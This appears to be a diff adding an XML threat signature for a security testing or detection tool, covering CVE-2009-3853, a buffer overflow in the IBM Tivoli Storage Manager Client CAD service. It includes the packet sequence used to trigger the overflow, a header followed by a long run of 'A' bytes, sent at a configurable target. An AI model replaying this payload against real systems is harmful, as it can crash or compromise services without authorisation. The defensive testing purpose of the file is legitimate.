@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="IBM Tivoli Storage Manager Client CAD Service Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in IBM Tivoli Storage Manager Client software. The vulnerability is due to a boundary error in the Client Acceptor Daemon (CAD) service while processing a specially crafted packet. Remote unauthenticated attackers can exploit this vulnerability to inject and execute arbitrary code on the target system. Successful exploitation of this vulnerability would allow for arbitrary code execution with the SYSTEM privileges of the CAD service. If the attack is not successful, the vulnerable service may terminate abnormally due to memory corruption."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IBM TSM Protocol"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="IBM"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IBM_Tivoli_Storage_Manager_Client/IBM_Tivoli_Storage_Manager_Express_Client"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IBM_Tivoli_Storage_Manager_Client_5.3.0.0_to_5.3.6.6&amp;5.4.0.0_to_5.4.2.7&amp;5.5.0.0_to_5.5.2.1&amp;6.1.0.0_to_6.1.0.1/IBM_Tivoli_Storage_Manager_Express_Client_5.3.3.0_to_5.3.6.6"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-3853"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="aa7d5bd666bb8a7c9c38b3b3210fb6fb"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633952758672375164"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1259866464" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="E">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="F">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="G">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:65:9B:7F" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="023C" Identification="D006" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="06F8" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="39995" destPort="$destPort" SeqNumber="8F2F4B8F" AckNumber="38152962" HeaderLength="08" WindowSize="002E" Checksum="14D4" UrgentPointer="0000" Options="0101080A17D49B8F00000000" Payload="020426A5000002004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:65:9B:7F" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="D007" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="08FF" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="39995" destPort="$destPort" SeqNumber="8F2F4D97" AckNumber="38152962" HeaderLength="08" WindowSize="002E" Checksum="80C5" UrgentPointer="0000" Options="0101080A17D49B8F00000000" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="true" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="2,3">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:0C:29:65:9B:7F" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="0149" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="97BD" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="39995" SeqNumber="38152962" AckNumber="8F2F4D98" HeaderLength="08" WindowSize="F8E8" Checksum="399F" UrgentPointer="0000" Options="0101080A00004E6B17D49B8F" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:0C:29:65:9B:7F" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="014A" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="97C8" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="39995" SeqNumber="38152962" AckNumber="8F2F4D98" HeaderLength="05" WindowSize="0000" Checksum="6D6A" UrgentPointer="0000" Options="" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="true" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
